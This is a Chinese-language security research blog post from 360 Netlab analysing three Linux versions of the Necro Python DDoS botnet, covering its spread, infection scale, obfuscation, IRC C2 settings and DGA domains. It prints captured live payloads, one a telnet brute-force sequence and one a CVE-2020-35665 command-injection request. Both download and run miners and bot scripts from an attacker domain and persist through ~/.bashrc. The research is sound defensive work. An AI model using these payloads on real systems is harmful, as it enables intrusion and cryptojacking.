<!DOCTYPE html>
<html lang="en">
<head>

    <title>Necro在频繁升级，新版本开始使用PyInstaller和DGA</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=42b57cac00" />

    <link rel="icon" href="https://blog.netlab.360.com/content/images/size/w256h256/2019/02/netlab_xs-2.png" type="image/png">
    <link rel="canonical" href="https://blog.netlab.360.com/not-really-new-pyhton-ddos-bot-n3cr0m0rph-necromorph/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="amphtml" href="https://blog.netlab.360.com/not-really-new-pyhton-ddos-bot-n3cr0m0rph-necromorph/amp/">
    
    <meta property="og:site_name" content="360 Netlab Blog - Network Security Research Lab at 360">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Necro在频繁升级，新版本开始使用PyInstaller和DGA">
    <meta property="og:description" content="概述


Necro是一个经典的Python编写的botnet家族，最早发现于2015年，早期针对Windows系统，常被报为Python.IRCBot，作者自己则称之为N3Cr0m0rPh(Necromorph)。自2021年1月1号起，360Netlab的BotMon系统持续检测到该家族的新变种，先后有3个版本的样本被检测到，它们均针对Linux系统，并且最新的版本使用了DGA技术来生成C2域名对抗检测。本文将对最近发现的Necro botnets做一分析。


本文的关键点如下：

1，Necro最新版的感染规模在万级，并且处于上升趋势。

2，在传播方式上，Necro支持多种方式，并且持续集成新公开的1-day漏洞，攻击能力较强。

3，最新版Necro使用了DGA技术生成C2域名，Python脚本也经过重度混淆以对抗静态分析。

4，目前传播的不同版本Necro botnet背后为同一伙人，并且主要针对Linux设备。

5，最新的2个版本为了确保能在没有Python2的受害机器上执行，会同时分发使用PyInstaller打包过的Python程序。


在撰写本文时,我们注意">
    <meta property="og:url" content="https://blog.netlab.360.com/not-really-new-pyhton-ddos-bot-n3cr0m0rph-necromorph/">
    <meta property="og:image" content="https://blog.netlab.360.com/content/images/2019/02/astronomy-constellation-dark-998641-4.jpg">
    <meta property="article:published_time" content="2021-01-21T08:17:02.000Z">
    <meta property="article:modified_time" content="2024-06-06T02:41:02.000Z">
    <meta property="article:tag" content="DGA">
    <meta property="article:tag" content="PyInstaller">
    <meta property="article:tag" content="Necro">
    <meta property="article:tag" content="Necromorph">
    <meta property="article:tag" content="N3Cr0m0rPh">
    <meta property="article:tag" content="Freakout">
    <meta property="article:tag" content="Python.IRCBot">
    <meta property="article:tag" content="CVE-2020-28188">
    <meta property="article:tag" content="CVE-2021-3007">
    <meta property="article:tag" content="CVE-2020-7961">
    <meta property="article:tag" content="Botnet">
    <meta property="article:tag" content="DDoS">
    <meta property="article:tag" content="IRC">
    <meta property="article:tag" content="aveixucyimxwcmph.xyz">
    <meta property="article:tag" content="gxbrowser.net">
    <meta property="article:tag" content="PythonMiner">
    <meta property="article:tag" content="Import 2022-11-30 11:16">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Necro在频繁升级，新版本开始使用PyInstaller和DGA">
    <meta name="twitter:description" content="概述


Necro是一个经典的Python编写的botnet家族，最早发现于2015年，早期针对Windows系统，常被报为Python.IRCBot，作者自己则称之为N3Cr0m0rPh(Necromorph)。自2021年1月1号起，360Netlab的BotMon系统持续检测到该家族的新变种，先后有3个版本的样本被检测到，它们均针对Linux系统，并且最新的版本使用了DGA技术来生成C2域名对抗检测。本文将对最近发现的Necro botnets做一分析。


本文的关键点如下：

1，Necro最新版的感染规模在万级，并且处于上升趋势。

2，在传播方式上，Necro支持多种方式，并且持续集成新公开的1-day漏洞，攻击能力较强。

3，最新版Necro使用了DGA技术生成C2域名，Python脚本也经过重度混淆以对抗静态分析。

4，目前传播的不同版本Necro botnet背后为同一伙人，并且主要针对Linux设备。

5，最新的2个版本为了确保能在没有Python2的受害机器上执行，会同时分发使用PyInstaller打包过的Python程序。


在撰写本文时,我们注意">
    <meta name="twitter:url" content="https://blog.netlab.360.com/not-really-new-pyhton-ddos-bot-n3cr0m0rph-necromorph/">
    <meta name="twitter:image" content="https://blog.netlab.360.com/content/images/2019/02/astronomy-constellation-dark-998641-4.jpg">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="jinye">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="DGA, PyInstaller, Necro, Necromorph, N3Cr0m0rPh, Freakout, Python.IRCBot, CVE-2020-28188, CVE-2021-3007, CVE-2020-7961, Botnet, DDoS, IRC, aveixucyimxwcmph.xyz, gxbrowser.net, PythonMiner, Import 2022-11-30 11:16">
    <meta name="twitter:site" content="@360Netlab">
    <meta name="twitter:creator" content="@SethKingHi">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="800">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "360 Netlab Blog - Network Security Research Lab at 360",
        "url": "https://blog.netlab.360.com/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://blog.netlab.360.com/content/images/2019/02/netlab-brand-5.png"
        }
    },
    "author": {
        "@type": "Person",
        "name": "jinye",
        "image": {
            "@type": "ImageObject",
            "url": "https://blog.netlab.360.com/content/images/2019/12/400--2-.jpeg",
            "width": 400,
            "height": 400
        },
        "url": "https://blog.netlab.360.com/author/jinye/",
        "sameAs": [
            "https://twitter.com/SethKingHi"
        ]
    },
    "headline": "Necro在频繁升级，新版本开始使用PyInstaller和DGA",
    "url": "https://blog.netlab.360.com/not-really-new-pyhton-ddos-bot-n3cr0m0rph-necromorph/",
    "datePublished": "2021-01-21T08:17:02.000Z",
    "dateModified": "2024-06-06T02:41:02.000Z",
    "keywords": "DGA, PyInstaller, Necro, Necromorph, N3Cr0m0rPh, Freakout, Python.IRCBot, CVE-2020-28188, CVE-2021-3007, CVE-2020-7961, Botnet, DDoS, IRC, aveixucyimxwcmph.xyz, gxbrowser.net, PythonMiner, Import 2022-11-30 11:16",
    "description": "概述\n\n\nNecro是一个经典的Python编写的botnet家族，最早发现于2015年，早期针对Windows系统，常被报为Python.IRCBot，作者自己则称之为N3Cr0m0rPh(Necromorph)。自2021年1月1号起，360Netlab的BotMon系统持续检测到该家族的新变种，先后有3个版本的样本被检测到，它们均针对Linux系统，并且最新的版本使用了DGA技术来生成C2域名对抗检测。本文将对最近发现的Necro botnets做一分析。\n\n\n本文的关键点如下：\n\n1，Necro最新版的感染规模在万级，并且处于上升趋势。\n\n2，在传播方式上，Necro支持多种方式，并且持续集成新公开的1-day漏洞，攻击能力较强。\n\n3，最新版Necro使用了DGA技术生成C2域名，Python脚本也经过重度混淆以对抗静态分析。\n\n4，目前传播的不同版本Necro botnet背后为同一伙人，并且主要针对Linux设备。\n\n5，最新的2个版本为了确保能在没有Python2的受害机器上执行，会同时分发使用PyInstaller打包过的Python程序。\n\n\n在撰写本文时,我们注意",
    "mainEntityOfPage": "https://blog.netlab.360.com/not-really-new-pyhton-ddos-bot-n3cr0m0rph-necromorph/"
}
    </script>

    <meta name="generator" content="Ghost 5.76">
    <link rel="alternate" type="application/rss+xml" title="360 Netlab Blog - Network Security Research Lab at 360" href="https://blog.netlab.360.com/rss/">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="db8c743e6bb1457403d255d83f" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://blog.netlab.360.com/" crossorigin="anonymous"></script>
    
    <link href="https://blog.netlab.360.com/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=42b57cac00"></script>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=42b57cac00">
    <style type='text/css'>
	#ghost-portal-root {
        display: none;
    }
</style><style>:root {--ghost-accent-color: #eca265;}</style>

</head>
<body class="post-template tag-dga tag-pyinstaller tag-necro tag-necromorph tag-n3cr0m0rph tag-freakout tag-python-ircbot tag-cve-2020-28188 tag-cve-2021-3007 tag-cve-2020-7961 tag-botnet tag-ddos tag-irc tag-aveixucyimxwcmph-xyz tag-gxbrowser-net tag-pythonminer tag-import-2022-11-30-11-16 has-cover">
<div class="viewport">

    <header id="gh-head" class="gh-head outer">
        <nav class="gh-head-inner inner">

            <div class="gh-head-brand">
                <a class="gh-head-logo" href="https://blog.netlab.360.com">
                        <img src="https://blog.netlab.360.com/content/images/2019/02/netlab-brand-5.png" alt="360 Netlab Blog - Network Security Research Lab at 360" />
                </a>
                <div class="gh-head-brand-wrapper">
                    <button class="gh-search" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                    <a class="gh-burger" role="button">
                        <div class="gh-burger-box">
                            <div class="gh-burger-inner"></div>
                        </div>
                    </a>
                </div>
            </div>
            <div class="gh-head-menu">
                <ul class="nav">
    <li class="nav-botnet"><a href="https://blog.netlab.360.com/tag/botnet/">Botnet</a></li>
    <li class="nav-dnsmon"><a href="https://blog.netlab.360.com/tag/dnsmon/">DNSMon</a></li>
    <li class="nav-ddos"><a href="https://blog.netlab.360.com/tag/ddos/">DDoS</a></li>
    <li class="nav-passivedns"><a href="https://blog.netlab.360.com/tag/pdns/">PassiveDNS</a></li>
    <li class="nav-mirai"><a href="https://blog.netlab.360.com/tag/mirai/">Mirai</a></li>
    <li class="nav-dta"><a href="https://blog.netlab.360.com/tag/dta/">DTA</a></li>
</ul>

            </div>
            <div class="gh-head-actions">
                <div class="gh-social">
                        <a class="gh-social-link gh-social-twitter" href="https://twitter.com/360Netlab" title="Twitter" target="_blank" rel="me noopener"><svg class="icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg></a>
                        <a class="gh-social-link gh-social-feedly" href="https://feedly.com/i/subscription/feed/https://blog.netlab.360.com/rss/" title="RSS" target="_blank" rel="me noopener"><svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><circle cx="6.18" cy="17.82" r="2.18"/><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/></svg>
</a>
                </div>
            </div>
        </nav>
    </header>

    <div class="site-content">
             <div class="floating-header">
    <div class="floating-header-logo">
        <a href="https://blog.netlab.360.com">
                <img src="/content/images/size/w30/2019/02/netlab_xs-2.png" alt="360 Netlab Blog - Network Security Research Lab at 360 icon" />
            <span>360 Netlab Blog - Network Security Research Lab at 360</span>
        </a>
    </div>
    <span class="floating-header-divider">&mdash;</span>
    <div class="floating-header-title">Necro在频繁升级，新版本开始使用PyInstaller和DGA</div>
    <div class="floating-header-share">
        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"/>
</svg>
</div>
        <a class="floating-header-share-tw" href="https://twitter.com/share?text=Necro%E5%9C%A8%E9%A2%91%E7%B9%81%E5%8D%87%E7%BA%A7%EF%BC%8C%E6%96%B0%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E4%BD%BF%E7%94%A8PyInstaller%E5%92%8CDGA&amp;url=https://blog.netlab.360.com/not-really-new-pyhton-ddos-bot-n3cr0m0rph-necromorph/"
            onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
            <svg class="icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg>        </a>
        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.netlab.360.com/not-really-new-pyhton-ddos-bot-n3cr0m0rph-necromorph/"
            onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
            <svg class="icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path d="M23.9981 11.9991C23.9981 5.37216 18.626 0 11.9991 0C5.37216 0 0 5.37216 0 11.9991C0 17.9882 4.38789 22.9522 10.1242 23.8524V15.4676H7.07758V11.9991H10.1242V9.35553C10.1242 6.34826 11.9156 4.68714 14.6564 4.68714C15.9692 4.68714 17.3424 4.92149 17.3424 4.92149V7.87439H15.8294C14.3388 7.87439 13.8739 8.79933 13.8739 9.74824V11.9991H17.2018L16.6698 15.4676H13.8739V23.8524C19.6103 22.9522 23.9981 17.9882 23.9981 11.9991Z"/></svg>        </a>
    </div>
    <progress id="reading-progress" class="progress" value="0">
        <div class="progress-container">
            <span class="progress-bar"></span>
        </div>
    </progress>
</div>


  <main id="site-main" class="site-main">
    <article class="article post tag-dga tag-pyinstaller tag-necro tag-necromorph tag-n3cr0m0rph tag-freakout tag-python-ircbot tag-cve-2020-28188 tag-cve-2021-3007 tag-cve-2020-7961 tag-botnet tag-ddos tag-irc tag-aveixucyimxwcmph-xyz tag-gxbrowser-net tag-pythonminer tag-import-2022-11-30-11-16 no-image ">

      <header class="article-header gh-canvas">

        <div class="article-tag post-card-tags">
          <span class="post-card-primary-tag">
            <a href="/tag/dga/">DGA</a>
          </span>
        </div>

        <h1 class="article-title">Necro在频繁升级，新版本开始使用PyInstaller和DGA</h1>


        <div class="article-byline">
          <section class="article-byline-content">

            <ul class="author-list">
              <li class="author-list-item">
                <a href="/author/jinye/" class="author-avatar">
                  <img class="author-profile-image" src="/content/images/2019/12/400--2-.jpeg" alt="jinye" />
                </a>
              </li>
            </ul>

            <div class="article-byline-meta">
              <h4 class="author-name"><a href="/author/jinye/">jinye</a></h4>
              <div class="byline-meta-content">
                <time class="byline-meta-date" datetime=" 2021-01-21">Jan 21, 2021</time>
                <span class="byline-reading-time"><span class="bull">&bull;</span> 16 min read</span>
              </div>
            </div>

          </section>
        </div>


      </header>

      <section class="gh-content gh-canvas">
        <h2 id="%E6%A6%82%E8%BF%B0">概述</h2>
<p>Necro是一个经典的Python编写的botnet家族，最早发现于2015年，早期针对Windows系统，常被报为Python.IRCBot，作者自己则称之为N3Cr0m0rPh(Necromorph)。自2021年1月1号起，360Netlab的BotMon系统持续检测到该家族的新变种，先后有3个版本的样本被检测到，它们均针对Linux系统，并且最新的版本使用了<a href="#dga">DGA</a>技术来生成C2域名对抗检测。本文将对最近发现的Necro botnets做一分析。</p>
<p>本文的关键点如下：<br>
1，Necro最新版的感染规模在万级，并且处于上升趋势。<br>
2，在传播方式上，Necro支持多种方式，并且持续集成新公开的1-day漏洞，攻击能力较强。<br>
3，最新版Necro使用了DGA技术生成C2域名，Python脚本也经过重度混淆以对抗静态分析。<br>
4，目前传播的不同版本Necro botnet背后为同一伙人，并且主要针对Linux设备。<br>
5，最新的2个版本为了确保能在没有Python2的受害机器上执行，会同时分发使用PyInstaller打包过的Python程序。</p>
<p>在撰写本文时,我们注意到先后有2家安全厂商报道了Necro botnet及其团伙<a href="#ref_1">[PythonCryptoMinter]</a><a href="#ref_2">[FreakOut]</a>，但他们描述的均是已经停止传播的第2个版本，本文将描述更多的关于Necro的内容。</p>
<h2 id="%E6%8D%95%E8%8E%B7">捕获</h2>
<p>Necro支持多种传播方式，其中2种被我们的Anglerfish蜜罐系统成功捕获到：一种是传统的telnet弱口令爆破，另一种是1-day 漏洞<strong>(</strong>CVE-2020-35665)。捕获记录如下：</p><figure class="kg-card kg-image-card"><img src="https://blog.netlab.360.com/content/images/2021/01/-----12.jpg" class="kg-image" alt loading="lazy" width="1410" height="400" srcset="https://blog.netlab.360.com/content/images/size/w600/2021/01/-----12.jpg 600w, https://blog.netlab.360.com/content/images/size/w1000/2021/01/-----12.jpg 1000w, https://blog.netlab.360.com/content/images/2021/01/-----12.jpg 1410w" sizes="(min-width: 720px) 720px"></figure><p>下面是实际捕获到的利用telnet弱口令传播第3版时的payload：</p><pre><code>root
password
enable
system
shell
sh
echo -e '\x41\x4b\x34\x37'
wget http://aspjobjreorejborer.com/mirai.armexport ARGS="-o aveixucyimxwcmph.xyz:9050";LINE="killall -9 .sshd||pkill -9 .sshd_;[ ! -f /tmp/.pidfile ] &amp;&amp; echo &gt; /tmp/.pidfile;nohup .sshd $ARGS &gt; /dev/null||nohup .sshd_ $ARGS &gt; /dev/null &amp;";grep -q "$LINE" ~/.bashrc||echo "$LINE" &gt;&gt; ~/.bashrc;curl http://aveixucyimxwcmph.xyz/xmrig1 -O||wget http://aveixucyimxwcmph.xyz/xmrig1 -O .sshd_;mv -f .sshd_ .sshd_;chmod 777 .sshd_;curl http://aveixucyimxwcmph.xyz/xmrig -O xmrig||wget http://aveixucyimxwcmph.xyz/xmrig -O xmrig;mv -f xmrig .sshd;chmod 777 .sshd;chmod +x ~/.bashrc;~/.bashrc;cd /tmp||php -r "file_put_contents(".benchmark", file_get_contents("http://aveixucyimxwcmph.xyz/.benchmark"));";curl http://aveixucyimxwcmph.xyz/.benchmark -O;curl http://aveixucyimxwcmph.xyz/.benchmark.py -O;php -r "file_put_contents(".benchmark.py", file_get_contents("http://aveixucyimxwcmph.xyz/.benchmark.py"));";wget http://aveixucyimxwcmph.xyz/.benchmark -O .benchmark;wget http://aveixucyimxwcmph.xyz/.benchmark.py -O .benchmark.py;chmod 777 .benchmark.py;chmod 777 .benchmark;python .benchmark.py||python2 .benchmark.py||python2.7 .benchmark.py||./.benchmark||./.benchmark.py &amp; 
</code></pre><p>下面是实际捕获到的利用 1-day漏洞CVE-2020-35665传播第3版时的payload：</p><pre><code>GET /include/makecvs.php?Event=`export ARGS="-o aveixucyimxwcmph.xyz:9050"
LINE="killall -9 .sshd||pkill -9 .sshd_
[ ! -f /tmp/.pidfile ] &amp;&amp; echo &gt; /tmp/.pidfile
nohup .sshd $ARGS &gt; /dev/null||nohup .sshd_ $ARGS &gt; /dev/null &amp;"
grep -q "$LINE" ~/.bashrc||echo "$LINE" &gt;&gt; ~/.bashrc
curl http://aveixucyimxwcmph.xyz/xmrig1 -O||wget http://aveixucyimxwcmph.xyz/xmrig1 -O .sshd_
mv -f .sshd_ .sshd_
chmod 777 .sshd_
curl http://aveixucyimxwcmph.xyz/xmrig -O xmrig||wget http://aveixucyimxwcmph.xyz/xmrig -O xmrig
mv -f xmrig .sshd
chmod 777 .sshd
chmod +x ~/.bashrc
~/.bashrc

cd /tmp||php -r "file_put_contents(\".benchmark\", file_get_contents(\"http://aveixucyimxwcmph.xyz/.benchmark\"));"
curl http://aveixucyimxwcmph.xyz/.benchmark -O
curl http://aveixucyimxwcmph.xyz/.benchmark.py -O
php -r "file_put_contents(\".benchmark.py\", file_get_contents(\"http://aveixucyimxwcmph.xyz/.benchmark.py\"));"
wget http://aveixucyimxwcmph.xyz/.benchmark -O .benchmark
wget http://aveixucyimxwcmph.xyz/.benchmark.py -O .benchmark.py

</code></pre><p>从上面的payload可以看到exp除了下载并执行原始的Python脚本（.benchmark.py），还会尝试下载并执行PyInstaller打包后的ELF文件（.benchmark），这是作者自第2版开始引入的手法，目的是为了提高执行成功率。因为Python 2已经到达EOL(end-of-life)，有些受害者机器上缺乏这个运行环境，而使用Pyinstaller打包后的Python程序将成为独立的ELF，即使目标机器上没有Python环境也可以正常执行。</p>
<p>值得说明的是漏洞CVE-2020-35665公开于2020年12月23日，距离我们首次捕获它的利用只有8天，可见作者对新漏洞的使用非常“积极”。</p>
<p>另外，除了Necro样本，上面的exp还会下载挖矿程序xmrig和xmrig1，利用360netlab其它维度的数据，我们发现同样的download server还曾用于mirai和一些Windows恶意exe程序的下载，说明Necro的作者同时在运营多个家族的botnet：</p>
<figure class="kg-card kg-image-card"><img src="https://blog.netlab.360.com/content/images/2021/01/-----1-1.jpg" class="kg-image" alt loading="lazy" width="1768" height="804" srcset="https://blog.netlab.360.com/content/images/size/w600/2021/01/-----1-1.jpg 600w, https://blog.netlab.360.com/content/images/size/w1000/2021/01/-----1-1.jpg 1000w, https://blog.netlab.360.com/content/images/size/w1600/2021/01/-----1-1.jpg 1600w, https://blog.netlab.360.com/content/images/2021/01/-----1-1.jpg 1768w" sizes="(min-width: 720px) 720px"></figure><h2 id="%E6%84%9F%E6%9F%93%E8%A7%84%E6%A8%A1">感染规模</h2>
<p>根据360netlab的DNSMon数据我们对第2和第3版的2个C2域名解析情况做了统计，以此来评估感染规模。根据下面的2个统计，我们能看到这两域名的unique客户端数均为2位数，考虑到数据采集位置的区别，真实的流量大概是我们统计的500～700倍，所以它们实际的规模均应该在万级。</p><p>下面是第2版C2域名的解析统计，能看到这个域名已经过了稳定期，处于下降状态。</p><figure class="kg-card kg-image-card"><img src="https://blog.netlab.360.com/content/images/2021/01/-----6.jpg" class="kg-image" alt loading="lazy" width="835" height="514" srcset="https://blog.netlab.360.com/content/images/size/w600/2021/01/-----6.jpg 600w, https://blog.netlab.360.com/content/images/2021/01/-----6.jpg 835w" sizes="(min-width: 720px) 720px"></figure><p>下面是第3版域名的解析统计，能看到解析量在上升，说明这个版本还处于发展阶段。</p><figure class="kg-card kg-image-card"><img src="https://blog.netlab.360.com/content/images/2021/01/-----9.jpg" class="kg-image" alt loading="lazy" width="1009" height="536" srcset="https://blog.netlab.360.com/content/images/size/w600/2021/01/-----9.jpg 600w, https://blog.netlab.360.com/content/images/size/w1000/2021/01/-----9.jpg 1000w, https://blog.netlab.360.com/content/images/2021/01/-----9.jpg 1009w" sizes="(min-width: 720px) 720px"></figure><h2 id="%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90">样本分析</h2>
<p>通过分析，我们发现2021年捕获的Necro样本可以分为3个版本，每个版本之间在传播方式、代码混淆和C2保存方面均有明显的区别，其中第1版 （necr0.py）到第2版（out.py）主要是代码结构上的调整，混淆度有所增加。同时第2版开始采用PyInstaller方式把Python程序打包成ELF。从第2版到第3版差别有所加大，不但代码混淆度显著增加，C2也从硬编码域名变成了使用DGA算法。此外，在传播方式上第3版也增加了一些n-day漏洞。</p><h4 id="%E7%AC%AC1%E7%89%88">第1版</h4>
<p>因为第1版被作者命名为necro.py，所以我们把该家族命名为Necro。在代码混淆上，第1版只是部分代码做了混淆处理：</p><figure class="kg-card kg-image-card"><img src="https://blog.netlab.360.com/content/images/2021/01/-----5.jpg" class="kg-image" alt loading="lazy" width="935" height="524" srcset="https://blog.netlab.360.com/content/images/size/w600/2021/01/-----5.jpg 600w, https://blog.netlab.360.com/content/images/2021/01/-----5.jpg 935w" sizes="(min-width: 720px) 720px"></figure><p>它的C2信息只是<a href="#decrypt_cc">简单编码</a>保存，经过若干次逆向解码可以容易的得到：</p>
<pre><code>irc server: '45.145.185.229'
channel: '#necro'
key: 'm0rph'
</code></pre>
<p>原始样本中可以发现可读的DDoS攻击相关的命令串：</p>
<figure class="kg-card kg-image-card"><img src="https://blog.netlab.360.com/content/images/2021/01/-----2.jpg" class="kg-image" alt loading="lazy" width="841" height="364" srcset="https://blog.netlab.360.com/content/images/size/w600/2021/01/-----2.jpg 600w, https://blog.netlab.360.com/content/images/2021/01/-----2.jpg 841w" sizes="(min-width: 720px) 720px"></figure><p>从这些命令串可以看出Necro是一个用于DDoS攻击的botnet，C2协议基于IRC，支持的攻击方式既包括常见的udpflood、synflood、slowloris、httpflood这些，也包括在botnet中不常见的amp反射攻击。</p>
<h4 id="%E7%AC%AC2%E7%89%88">第2版</h4>
<p>第2版（out.py）和第1版的混淆程度相当，但在漏洞利用上有变化，加入了Zend Framework (known as CVE-2021-3007)：</p>
<figure class="kg-card kg-image-card"><img src="https://blog.netlab.360.com/content/images/2021/01/-----4.jpg" class="kg-image" alt loading="lazy" width="814" height="376" srcset="https://blog.netlab.360.com/content/images/size/w600/2021/01/-----4.jpg 600w, https://blog.netlab.360.com/content/images/2021/01/-----4.jpg 814w" sizes="(min-width: 720px) 720px"></figure><p>值得说明的是该漏洞2021年1月4日才曝光，这再次说明Necro的作者在利用新漏洞方面非常“积极”。</p><p>在C2存放方面，第2版同样使用了简单编码保存：</p>
<pre><code>irc server: 'gxbrowser.net'
channel: '#update'
key: 'N3Wm3W'
</code></pre>
<h4 id="%E7%AC%AC3%E7%89%88">第3版</h4>
<p>第3版的被检测到用benchmark.py名称传播。相比前两个版本，第3版最大的变化是使用DGA来生成C2域名，具体算法参考后面的<a href="#dga">DGA</a>代码，下面是模拟该算法产生的部分域名:</p>
<pre><code>avEiXUcYimXwcMph.xyz
avEiXUcYimXwcMph.xyz
avEiXUcYimXwcMph.xyz
aoRmVwOaTOGgYqbk.xyz
aoRmVwOaTOGgYqbk.xyz
aoRmVwOaTOGgYqbk.xyz
MasEdcNVYwedJwVd.xyz
MasEdcNVYwedJwVd.xyz
MasEdcNVYwedJwVd.xyz
suBYdZaoqwveKRlQ.xyz
...
</code></pre>
<p>通过360netlab的DNSMon系统，我们看到该DGA算法产生的第1个域名aveixucyimxwcmph.xyz已经启用，并且被用作下载服务器的域名。下面是该域名的详细信息：</p>
<pre><code>2021-01-11 11:49:28	2021-01-20 03:47:28	372	aveixucyimxwcmph.xyz	A	193.239.147.224	
2021-01-11 20:11:02	2021-01-11 20:11:03	2	aveixucyimxwcmph.xyz	TXT	"v=spf1 include:spf.efwd.registrar-servers.com ~all"	
2021-01-11 20:11:01	2021-01-11 20:11:03	3	aveixucyimxwcmph.xyz	MX	eforward4.registrar-servers.com	
2021-01-11 20:11:01	2021-01-11 20:11:03	3	aveixucyimxwcmph.xyz	MX	eforward5.registrar-servers.com	
2021-01-11 20:11:01	2021-01-11 20:11:03	3	aveixucyimxwcmph.xyz	MX	eforward2.registrar-servers.com	
2021-01-11 20:11:01	2021-01-11 20:11:03	3	aveixucyimxwcmph.xyz	MX	eforward1.registrar-servers.com	
2021-01-11 20:11:01	2021-01-11 20:11:03	3	aveixucyimxwcmph.xyz	MX	eforward3.registrar-servers.com

</code></pre>
<p>2021年1月20号，在最新的第3版样本中作者又对DGA算法做了修改，将种子从3种修改为4096种，同时开始使用SSL加密通信数据。</p>
<p>第3版的另一个变化是代码混淆的更严重了，不仅所有自定义对象全部被替换成随机字符，连字符串也被用base64.encode(zlib.compress(plain_string))这种方式做了编码，导致样本中不再有可读的、有意义的字符串，如下图所示：</p>
<figure class="kg-card kg-image-card"><img src="https://blog.netlab.360.com/content/images/2021/01/-----14.jpg" class="kg-image" alt loading="lazy" width="1588" height="819" srcset="https://blog.netlab.360.com/content/images/size/w600/2021/01/-----14.jpg 600w, https://blog.netlab.360.com/content/images/size/w1000/2021/01/-----14.jpg 1000w, https://blog.netlab.360.com/content/images/2021/01/-----14.jpg 1588w" sizes="(min-width: 720px) 720px"></figure><p>在传播方式上，第3版增加了更多的漏洞利用，这一点可以从解码后的字符串看出来：</p>
<figure class="kg-card kg-image-card"><img src="https://blog.netlab.360.com/content/images/2021/01/-----8.jpg" class="kg-image" alt loading="lazy" width="829" height="476" srcset="https://blog.netlab.360.com/content/images/size/w600/2021/01/-----8.jpg 600w, https://blog.netlab.360.com/content/images/2021/01/-----8.jpg 829w" sizes="(min-width: 720px) 720px"></figure><p>在支持的DDoS攻击方法方面第3版没有变化，只是命令串被做了编码处理，解码后的DDoS命令串如下：</p>
